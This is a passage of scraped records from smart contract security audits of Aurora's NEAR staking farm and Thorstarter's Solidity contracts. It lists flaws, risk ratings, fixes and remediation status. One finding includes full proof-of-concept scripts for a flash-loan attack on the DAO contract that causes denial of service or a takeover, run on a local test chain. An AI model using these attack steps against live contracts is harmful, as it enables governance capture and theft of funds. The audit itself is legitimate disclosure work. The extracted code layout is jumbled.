ping () )) ; Listing 7: Owner getting all rewards let ( root , pool ) = setup ( to_yocto (\" 10000 \" ) + 1 _000_000_000_000 let mut root_balance = to_int ( view! ( pool . let user1 = create_user_and_stake (& root , & pool ); wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; 1 fn owner_gets_all_rewards () { 2  , 10 , 0) ; 3 4 5 6 7  get_account_total_balance ( root . account_id () )) ); 8  get_account_total_balance ( user1 . account_id () )) ); 9 10  root_balance , user_balance ); 11 12 13 14 wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; let mut user_balance = to_int ( view! ( pool . log! ( \" First iteration : Root balance : {}\\ nUser balance : {} \" , 23 root_balance = to_int ( view! ( pool . get_account_total_balance ( user_balance = to_int ( view! ( pool . get_account_total_balance ( 15  root . account_id () ))); 16  user1 . account_id () )) ); 17 18  root_balance , user_balance ); 19 } log! ( \" Second iteration : Root balance : {}\\ nUser balance : {} \" , Risk Level: Likelihood - 2 Impact - 5 Recommendation: The assert_valid() function must be called before the fraction is used to create the StakingContract instance. Remediation Plan: SOLVED: The Aurora team fixed this issue in https://github.com/referencedev/staking- farm/pull/11. 24 ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: Medium"]}, {"title": "HAL05", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "This behavior exists in multiple areas of the project, for example in the multiply() function implemented for the Ratio struct in staking- farm/src/lib.rs. It is required to enforce that the ratio is valid. Code Location: Listing 8: staking-farm/src/lib.rs if self . denominator == 0 || self . numerator == 0 { 175 pub fn multiply (& self , value : Balance ) -> Balance { 176 177 178 179 0 } else { ( U256 :: from ( self . numerator ) * U256 :: from ( value ) / U256  :: from ( self . denominator )) 180 181 182 } } . as_u128 () Risk Level: Likelihood - 2 Impact - 3 Recommendation: Ratio validation should always take place to avoid cases of overflow. 25 Remediation Plan: SOLVED: The Aurora team fixed this issue in https://github.com/referencedev/staking- farm/pull/11. 26 ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: Low"]}, {"title": "HAL06", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "is equal to env::predecessor_account_id(). It was observed that the claim() function accepts that delegator_id Enabling this will cause the smart contract to perform a redundant operation of doing a cross contract call to the delegator and then setting claim_account_id and send_account_id to the same value in internal_claim(). Code Location:  staking-farm/src/farm.rs: claim() Recommendation: Consider avoid redundant operations. asserting delegator_id != env::predecessor_account_id() to Remediation Plan: NOT APPLICABLE: The Aurora team will not fix since it does not pose a direct risk and updating the code might introduce other bugs. 27 ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: Low"]}, {"title": "HAL07", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The following crates used in the project dependencies have known vulner- abilities: ID RUSTSEC-2020-0159 package chrono RUSTSEC-2021-0067 RUSTSEC-2021-0013 RUSTSEC-2021-0089 cranelift- codegen raw-cpuid raw-cpuid RUSTSEC-2022-0013 regex RUSTSEC-2020-0071 RUSTSEC-2021-0110 time wasmtime Recommendation: Short Description Potential segfault in localtime_r invoca- tions Memory access due to code generation flaw in Cranelift module Soundness issues in raw-cpuid Optional lacking validation Regexes with large repetitions on empty sub- expressions take a very long time to parse Potential segfault in the time crate Multiple Vulnerabilities in Wasmtime implementations Deserialize Even if those vulnerable crates cannot affect the underlying application, it is recommended to be aware of them. Furthermore, you need to configure dependency monitoring to always be alert when a new vulnerability is disclosed in one of the project crates. Remediation Plan: RISK ACCEPTED: The Aurora team accepted the risk of this finding; however, no fixes were introduced as the affected crates are not under the teams control. 28 ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: Low"]}, {"title": "HAL08", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The deposit() function does not assert that the attached deposit works. Users can call this function without attaching a deposit by making the amount zero in the internal_deposit function. Code Location:  staking-farm/src/stake.rs: deposit() Recommendation: It is advised to assert at least one to avoid any redundant calls to that function. Remediation Plan: NOT APPLICABLE: The Aurora team decided this will not be fixed since it does not pose a direct risk. 29 ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: Low"]}, {"title": "HAL09", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the new function, an assert prevents anyone from re-initializing the contract. However, since the #[init] macro is used, this check is redundant. Code Location: Listing 9: staking-farm/src/lib.rs (Line 200) 193 194 195 196 197 198 199 200 201 202 #[ init ] pub fn new ( owner_id : AccountId , stake_public_key : PublicKey , reward_fee_fraction : Ratio , burn_fee_fraction : Ratio , ) -> Self { assert! ( !env :: state_exists () , \" Already initialized \" ); reward_fee_fraction . assert_valid () ; ... Recommendation: Consider removing that assertion to avoid redundant code. Remediation Plan: SOLVED: The Aurora team fixed this issue in https://github.com/referencedev/staking- farm/pull/11. 30 3.10 (HAL-10) HAL10 - ASSERTION SHOULD BE REPLACED BY A MACRO - INFORMATIONAL ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: Informational"]}, {"title": "WRONG CONSTANT USED IN EMISSIONSSPLITTER.SOL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The contract EmissionsSplitter receives XRUNE token emissions and then calls the run() function to split up its current balance between the private investors, teams, DAO and ecosystem contracts/addresses following their respective vesting curves. These are the vesting curves: As we can see, for the teams there is a total of 110,000,000 tokens. In the contract, we can see defined that in the first half (2 years) 66,000,000 of these tokens will be given, and then, on the second half, the rest (44,000,000 tokens): 15 Listing 1: EmissionsSplitter.sol (Lines 24,25) 21 22 23 24 25 26 uint public constant ONE_YEAR = 31536000; uint public constant INVESTORS_EMISSIONS_HALF1 = 45000000 e18 ; uint public constant INVESTORS_EMISSIONS_HALF2 = 30000000 e18 ; uint public constant TEAM_EMISSIONS_HALF1 = 66000000 e18 ; uint public constant TEAM_EMISSIONS_HALF2 = 44000000 e18 ; uint public constant ECOSYSTEM_EMISSIONS = 250000000 e18 ; In the function run() we can see that the constant TEAM_EMISSIONS_HALF1 is being used incorrectly instead of TEAM_EMISSIONS_HALF2. Code Location: Listing 2: EmissionsSplitter.sol (Lines 103,107) 89 uint sentToTeamNow = 0; 90 { 91 92 // Team get 66 M tokens linearly over the first 2 years uint teamProgress = _min ((( block . timestamp - emissionsStart ) * 1 e12 ) / (2 * ONE_YEAR ) , 1 e12 ); 93 uint teamUnlocked = ( teamProgress * TEAM_EMISSIONS_HALF1 ) / 1 94 95 96 97 98 99 100 101 } 102 { 103 104 105 106 107 108 e12 ; uint teamAmount = _min ( teamUnlocked - sentToTeam , amount ); if ( teamAmount > 0) { sentToTeamNow += teamAmount ; sentToTeam += teamAmount ; amount -= teamAmount ; token . safeTransfer ( team , teamAmount ); } // Team get their remaining 44 M tokens linearly over the next 2 years uint elapsed = block . timestamp - emissionsStart ; elapsed -= _min ( elapsed , 2 * ONE_YEAR ); uint teamProgress = _min (( elapsed * 1 e12 ) / (2 * ONE_YEAR ) , 1 e12 ); uint teamUnlocked = ( teamProgress * TEAM_EMISSIONS_HALF1 ) / 1 e12 ; uint teamAmount = _min ( teamUnlocked - _min ( teamUnlocked , sentToTeam ) , amount ); 16 109 110 111 112 113 114 115 } if ( teamAmount > 0) { sentToTeamNow += teamAmount ; sentToTeam += teamAmount ; amount -= teamAmount ; token . safeTransfer ( team , teamAmount ); } Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to replace TEAM_EMISSIONS_HALF1 with TEAM_EMISSIONS_HALF2 constant in line 107 of EmissionsSplitter.sol. Remediation Plan: SOLVED: TEAM_EMISSIONS_HALF2. Thorstarter Team currently uses the right constant 17 ", "labels": ["Halborn", "Thorstarter", "Severity: High"]}, {"title": "DOS/CONTRACT TAKEOVER ON DAO.SOL CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "DAO.sol contract allows the creation of different proposals including the following features:  Add support for pools: multiple options per proposal instead of just a for/against  Support multiple actions per option. So multiple transactions can be executed by one proposal  Use a voters contract to snapshot voting power, the address used The voting power is based on the locked XRUNE can be updated. (vXRUNE/voting token). its reconfigure  Can own parameters: minBalanceToPropose, minPercentQuorum, minVotingTime, minExecutionDelay  The execute method can be called by anybody if the proposal is passed and not yet executed Based on this, by doing a flash loan an attacker could: - Case 1: Cause a DOS in the contract - Case 2: Take total control of the DAO.sol contract The DAO.sol contract makes use of this Voters.sol contract to handle the voting for the different proposals, and as such, we have included this vulnerability in the report. Case 1: Cause a DOS in the contract - Manual test: In this case we have followed these steps to cause a DOS in the contract: 1. Perform a flash loan of XRUNEs and lock all those XRUNEs tokens so we obtain more than the 50% of the total voting power 2. Create a proposal which calls Voters.toggleSnapshotter(DAO address) 18 3. Return the flash loan 4. Give it our vote 5. Execute it This way, the contract DAO.sol will lose the snapshotters role in the Voters contract which is required to create a new proposal. Right after this call, no new proposals can be created. Listing 3: DOS through toggleSnapshotter() (Lines 64,67,76) 1 # Deploying test Token contracts 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # DAO contract should be a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # Example users 15 ## user1 33% of voting power 16 >>> user1 = accounts [1] 17 >>> XRuneToken [0]. transfer ( user1 . address , 33) 18 >>> XRuneToken [0]. approve ( Voters [0]. address , 33 , { ' from ': user1 }) 19 >>> Voters [0]. lock (33 , { ' from ': user1 }) 20 21 ## user2 16% of voting power 22 >>> user2 = accounts [2] 23 >>> XRuneToken [0]. transfer ( user2 , 16) 24 >>> XRuneToken [0]. approve ( Voters [0]. address , 16 , { ' from ': user2 }) 25 >>> Voters [0]. lock (16 , { ' from ': user2 }) 26 27 # attacker comes and performs a flash loan of XRUNE tokens to get 51% of the voting power 28 >>> attacker = accounts [9] 19 29 >>> XRuneToken [0]. transfer ( attacker , 51) 30 >>> XRuneToken [0]. approve ( Voters [0]. address , 51 , { ' from ': attacker }) 31 >>> Voters [0]. lock (51 , { ' from ': attacker }) 32 33 # Voting power 34 >>> print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 35 votes ( user1 ) -> 33 36 >>> print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 37 votes ( user2 ) -> 16 38 >>> print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 39 votes ( attacker ) -> 51 40 41 # Attacker creates a proposal that calls Voters . toggleSnapshotter ( DAO ' s address ) 42 >>> encoded_toggleSnapshotter = Voters . signatures [' toggleSnapshotter '] + eth_abi . encode_abi ([ ' address ' ,] , ( DAO [0]. address ,) ). hex () 43 >>> bytes_toggleSnapshotter = to_bytes ( encoded_toggleSnapshotter , ' bytes ') 44 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( Voters [0]. address , 0, bytes_toggleSnapshotter )) . hex () 45 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 46 >>> proposalID = proposalID . return_value 47 >>> proposalID 48 1 49 50 # Attacker returns the flash loan 51 >>> Voters [0]. unlock (51 , { ' from ': attacker }) 52 53 # Attacker votes for his proposal 54 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 55 56 # The other users vote to reject the proposal 57 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 58 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user2 }) 59 60 # After 24 hours ... 61 >>> chain . sleep (86401) 62 63 # Attacker executes the self - approved proposal 64 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 20 65 Transaction sent : 0 xdb6533a7eeb2426681ac4eab6dc638 ... 66 Nonce : 5 67 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13061360 Gas used : 63783 (0.95%) 68 69 < Transaction '0 xdb6533a7eeb2426681ac4eab6dc638 ... ' > 70 71 72 # Now another user comes and tries to create a new proposal 73 >>> DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[] , []] , { ' from ': user1 }) 74 Transaction sent : 0 x6449063f2cc6b237dd5f7693a76c7e ... 75 Nonce : 3 76 Gas price : 0.0 gwei DAO . propose confirmed ( not snapshotter ) Gas limit : 6721975 Block : 13061361 Gas used : 30712 (0.46%) 77 78 < Transaction '0 x6449063f2cc6b237dd5f7693a76c7e ... ' > Case 2: Take total control of the DAO.sol contract - Manual test: For this case we have followed these steps to take control of the DAO contract: 1. Create a malicious contract called EvilVoters.sol with the same structure and similar code as the current Voters.sol contract 2. Initialize the EvilVoters.sol contract with our own fake tokens 3. Add the DAO.sol contract address as an snapshotter of our malicious contract 4. Perform a flash loan of XRUNEs and lock all those XRUNE tokens so we obtain more than the 50% of the total voting power 5. Create a proposal which calls DAO.setVoters(EvilVoters.sol's address ) 6. Return the flash loan 7. Give it our vote 8. Execute it After the proposal is executed the new voters contract will be our In this contract, we are the only ones that have malicious contract. 21 tokens which give us total control over the DAO contract to propose and execute anything. Listing 4: 100,103,162,165) DAO Contract takeover through DAO.setVoters() (Lines 1 # Deploying test Token contracts ... 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # Adding DAO contract as a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # Example users 15 ## user1 33% of voting power 16 ### Giving user 1 33% of the voting power 17 >>> user1 = accounts [1] 18 >>> XRuneToken [0]. transfer ( user1 . address , 33) 19 >>> XRuneToken [0]. approve ( Voters [0]. address , 33 , { ' from ': user1 }) 20 >>> Voters [0]. lock (33 , { ' from ': user1 }) 21 22 ## user2 16% of voting power 23 ### Giving user 2 16% of the voting power 24 >>> user2 = accounts [2] 25 >>> XRuneToken [0]. transfer ( user2 , 16) 26 >>> XRuneToken [0]. approve ( Voters [0]. address , 16 , { ' from ': user2 }) 27 >>> Voters [0]. lock (16 , { ' from ': user2 }) 28 29 ## attacker creates a new Voters . sol contract with his own fake tokens which are FakeToken1 and FakeToken2 30 >>> attacker = accounts [9] 31 ### Deploying FakeToken contracts ... 32 >>> attacker . deploy ( FakeToken1 ) 33 >>> attacker . deploy ( FakeToken2 ) 22 34 35 ### deploying malicious Voters contract ... 36 >>> attacker . deploy ( Voters , attacker . address , FakeToken1 [0]. address , FakeToken2 [0]. address ) 37 38 ### Adding DAO contract as a snapshotter of the malicious Voters . sol 39 >>> Voters [1]. toggleSnapshotter ( DAO [0]. address ) 40 41 ## Voters [0] -> Original voters contract 42 ## Voters [1] -> Malicious voters contract created by the attacker 43 ### Attacker locks 1000000 FakeTokens1 in the malicious voters contract 44 >>> FakeToken1 [0]. transfer ( attacker , 1000000) 45 >>> FakeToken1 [0]. approve ( Voters [1]. address , 1000000 , { ' from ': attacker }) 46 >>> Voters [1]. lock (1000000 , { ' from ': attacker }) 47 >>> print (\" Attacker voting power in the malicious voters contract -> \" + str ( Voters [1]. votes ( attacker )) + \"\\ n \") 48 Attacker voting power in the malicious voters contract -> 1000000 49 50 ## attacker comes and performs a flash loan of XRUNE tokens to get 51% of the voting power in the original voters contract 51 >>> XRuneToken [0]. transfer ( attacker , 51) 52 >>> XRuneToken [0]. approve ( Voters [0]. address , 51 , { ' from ': attacker }) 53 >>> Voters [0]. lock (51 , { ' from ': attacker }) 54 55 # Voting power 56 >>> print () 57 print (\" Voting power in the original voters contract \") 58 print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 59 print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 60 print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 61 print () 62 print (\" Voting power in the malicious voters contract \") 63 print (\" votes ( user1 ) -> \" + str ( Voters [1]. votes ( user1 )) ) 64 print (\" votes ( user2 ) -> \" + str ( Voters [1]. votes ( user2 )) ) 65 print (\" votes ( attacker ) -> \" + str ( Voters [1]. votes ( attacker )) ) 66 print () 67 68 Voting power in the original voters contract 69 votes ( user1 ) -> 33 70 votes ( user2 ) -> 16 23 71 votes ( attacker ) -> 51 72 73 Voting power in the malicious voters contract 74 votes ( user1 ) -> 0 75 votes ( user2 ) -> 0 76 votes ( attacker ) -> 1000000 77 78 # Attacker creates a proposal that calls setVoters ( Malicious voters contract address ) 79 >>> encoded_setVoters = DAO . signatures [ ' setVoters '] + eth_abi . encode_abi ([ ' address ' ,] , ( Voters [1]. address ,) ). hex () 80 >>> bytes_setVoters = to_bytes ( encoded_setVoters , ' bytes ') 81 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setVoters )) . hex () 82 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 83 >>> print (\" ProposalID -> \" + str ( proposalID ) + \"\\ n \") 84 ProposalID -> 1 85 86 # Attacker returns the flash loan . This is done before voting for its own proposal , as the voting power used by the smart contract is the voting power that the users had at the time of the proposal creation 87 >>> Voters [0]. unlock (51 , { ' from ': attacker }) 88 89 # Attacker votes to approve his own proposal 90 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 91 92 # The other users vote to reject the proposal 93 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 94 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user2 }) 95 96 # After 24 hours ... 97 >>> chain . sleep (86401) 98 99 # Attacker executes the proposal 100 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 101 Transaction sent : 0 xca6d0d8e67b51644c81535b2435303e ... 102 Nonce : 12 103 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13069245 Gas used : 77831 (1.16%) 104 105 < Transaction '0 xca6d0d8e67b51644c81535b2435303e ... ' > 24 106 107 ## Let 's give now a lot of voting power to the user1 and user2 108 >>> XRuneToken [0]. transfer ( user1 , 500000000 e10 ) 109 >>> XRuneToken [0]. approve ( Voters [0]. address , 500000000 e10 , { ' from ': user1 }) 110 >>> Voters [0]. lock (500000000 e10 , { ' from ': user1 }) 111 >>> XRuneToken [0]. transfer ( user2 , 500000000 e10 ) 112 >>> XRuneToken [0]. approve ( Voters [0]. address , 500000000 e10 , { ' from ': user2 }) 113 >>> Voters [0]. lock (500000000 e10 , { ' from ': user2 }) 114 115 # Voting power 116 >>> print () 117 print (\" Voting power in the original voters contract \") 118 print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 119 print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 120 print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 121 print () 122 print (\" Voting power in the malicious voters contract \") 123 print (\" votes ( user1 ) -> \" + str ( Voters [1]. votes ( user1 )) ) 124 print (\" votes ( user2 ) -> \" + str ( Voters [1]. votes ( user2 )) ) 125 print (\" votes ( attacker ) -> \" + str ( Voters [1]. votes ( attacker )) ) 126 print () 127 128 Voting power in the original voters contract 129 votes ( user1 ) -> 5000000000000000033 130 votes ( user2 ) -> 5000000000000000016 131 votes ( attacker ) -> 0 132 133 Voting power in the malicious voters contract 134 votes ( user1 ) -> 0 135 votes ( user2 ) -> 0 136 votes ( attacker ) -> 1000000 137 138 ## attacker creates a new proposal to setMinBalanceToPropose to 1000000 139 >>> encoded_setMinBalanceToPropose = DAO . signatures [' setMinBalanceToPropose '] + eth_abi . encode_abi ([ ' uint256 ' ,] , (1000000 ,) ). hex () 140 >>> bytes_setMinBalanceToPropose = to_bytes ( encoded_setMinBalanceToPropose ,' bytes ') 141 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setMinBalanceToPropose )) . hex () 142 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 25 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 143 >>> proposalID = proposalID . return_value 144 >>> print (\" Second proposal created by the attacker - ProposalID -> \" + str ( proposalID ) + \"\\ n \") 145 Second proposal created by the attacker - ProposalID -> 2 146 147 # Attacker votes to approve it 148 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 149 150 # User1 and user2 vote to reject it 151 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user1 }) 152 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user2 }) 153 154 # Finish the voting period 155 >>> chain . sleep (86401) 156 157 # We check the minBalanceToPropose before executing the proposal 158 >>> print (\" minBalanceToPropose before executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () ) + \"\\ n \") 159 minBalanceToPropose before executing the proposal -> 10 160 161 # Execute the proposal 162 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 163 Transaction sent : 0 x5cdb022231acb822c48c4ffe8c58aab675 ... 164 165 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13069256 Nonce : 15 Gas used : 76851 (1.14%) 166 167 < Transaction '0 x5cdb022231acb822c48c4ffe8c58aab675 ... ' > 168 169 # Get the value of minBalanceToPropose after executing the proposal 170 >>> print (\" minBalanceToPropose after executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () )) 171 minBalanceToPropose after executing the proposal -> 1000000 Risk Level: Likelihood - 3 Impact - 5 26 Recommendation: In the current Voters.sol contract, the tokens locked should take a fixed If a malicious user period of time before they grant voting power. performs a flash loan of XRUNE tokens and locks them, they will not get their voting power increased before they have to return the flash loan. So, it is recommended not allowing to lock() and unlock() XRUNE in the same transaction. Remediation Plan: SOLVED: Thorstarter Team rightly implemented a fix to mitigate the risk of flash loans by not allowing to lock() unlock() XRUNE in the same transaction. 27 ", "labels": ["Halborn", "Thorstarter", "Severity: High"]}, {"title": "FINALWITHDRAW FUNCTION MISSING REQUIRE STATEMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The contracts Sale.sol and SaleFloating.sol have a function called finalWithdraw() which allows the owner to extract all the tokens. This function allows the owner of the contract to perform a rug pull as he would be able to retrieve all the tokens at any given time. Code Location: Listing 5: Sale.sol 249 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 250 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 251 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 252 253 254 255 256 257 258 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; totalAmountWithdrawn += _paymentAmount ; require ( totalAmountWithdrawn <= raisingAmount , ' can only widthdraw what is owed '); } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 259 260 } Listing 6: SaleFloating.sol 220 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 221 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 28 222 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 223 224 225 226 227 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 228 229 } Risk Level: Likelihood - 2 Impact - 5 Recommendation: finalWithdraw() function should have a require statement that does not allow the withdraw unless the redeeming period has been completed. In order to achieve this, this could be a possible implementation: Listing 7: Example (Lines 6,7,9,11) 1 uint public startBlock ; 2 // The block number when sale ends 3 uint public endBlock ; 4 // The block number when tokens are redeemable 5 uint public tokensBlock ; 6 // The block number that sets the end of the redeeming period 7 uint public tokensEndBlock ; 8 9 // New finalWithdraw () function 10 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 11 require ( block . number > tokensEndBlock , ' redeeming period is not over yet '); 12 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 29 13 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 14 15 16 17 18 19 20 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; totalAmountWithdrawn += _paymentAmount ; require ( totalAmountWithdrawn <= raisingAmount , ' can only withdraw what is owed '); } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 21 22 } tokensEndBlock would set when the redeeming period is finished and then, in the finalWithdraw() function, there would be a require statement that would check that the redeeming period is completed in order to withdraw the tokens. Remediation Plan: SOLVED: Thorstarter Team added a requirement so the function finalWithdraw () can only be called if the sale have not started yet or if the sale have finished at least 7 days ago. 30 ", "labels": ["Halborn", "Thorstarter", "Severity: Medium"]}, {"title": "SALE DATE CAN BE MODIFIED ONCE STARTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The contracts Sale.sol and SaleFloating.sol have the following state variables: Listing 8: Sale.sol (Lines 42,44) 41 // The block number when sale starts 42 uint public startBlock ; 43 // The block number when sale ends 44 uint public endBlock ; 45 // The block number when tokens are redeemable 46 uint public tokensBlock ; 47 // Total amount of raising tokens that need to be raised 48 uint public raisingAmount ; These variables set the start and the end date of the Sale. Once the sale is started the startBlock variable can be modified with the function setStartBlock(). This means that if the new startBlock is higher than the current block.number the sale schedule can be modified. Thorstarter mentioned this was intended, as a way to pause deposits/withdrawals or extend the time before tokens are claimable in case the project needed more time to sort issues out. For this case, Halborn believes that a better approach could be using a modifier like notPaused for all these deposit/withdrawals functions and never allowing the modification of the sale schedule, once it was already started. On the other hand, the state variables startBlock, endBlock, tokensBlock and raisingAmount should not be modified once the sale has started, for that reason the setter methods setStartBlock(), setEndBlock() and setTokensBlock() should be edited so they require that the sale has not started to be executed. Otherwise a malicious owner/keeper could change the schedule of the sale. This vulnerability is also related to HAL-04. Both vulnerabilities 31 The finalWithdraw should be fixed to ensure a correct functionality. () function suggested fix, would be useless, and could be bypassed, if the start/end/redeeming dates could be modified by the owner after the sale had started. Code Location: Listing 9: Sale.sol (Lines 87,88,96,97) startBlock = _block ; _validateBlockParams () ; 131 function setStartBlock ( uint _block ) public onlyOwnerOrKeeper { 132 133 134 } 135 136 function setEndBlock ( uint _block ) public onlyOwnerOrKeeper { 137 138 139 } 140 141 function setTokensBlock ( uint _block ) public onlyOwnerOrKeeper { 142 143 144 } endBlock = _block ; _validateBlockParams () ; tokensBlock = _block ; _validateBlockParams () ; Risk Level: Likelihood - 1 Impact - 5 Recommendation: Use a modifier like notPaused for all these deposit/withdrawals functions. Functions setStartBlock(), setEndBlock() and setTokensBlock() should have Once a require statement that checks that the sale has not started. started the sale schedule should never be modified. 32 Remediation Plan: SOLVED: Thorstarter Team decided to remove all the setter functions which allowed changes to the sale parameters. Functions setStartBlock(), setEndBlock() and setTokensBlock() were removed. The sale schedule can now only be set in the constructor. 33 ", "labels": ["Halborn", "Thorstarter", "Severity: Medium"]}, {"title": "PARTY CAN BE LEFT WITHOUT ANY OWNER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The contract LpTokenVesting.sol contains the function toggleOwner(). This function could leave a party without any owner if its wrongly executed. This means that the party would not be able to claim their vested tokens. Code Location: Vulnerable code Listing 10: LpTokenVesting.sol 63 function toggleOwner ( uint party , address owner ) public { 64 65 66 67 68 } Party storage p = parties [ party ]; require ( p. owners [ msg . sender ], \" not an owner of this party \" ); p. owners [ owner ] = ! p. owners [ owner ]; owners [ owner ] = p. owners [ owner ]; Listing 11: Test done with brownie 1 # Check if a party can be left without an owner 2 def 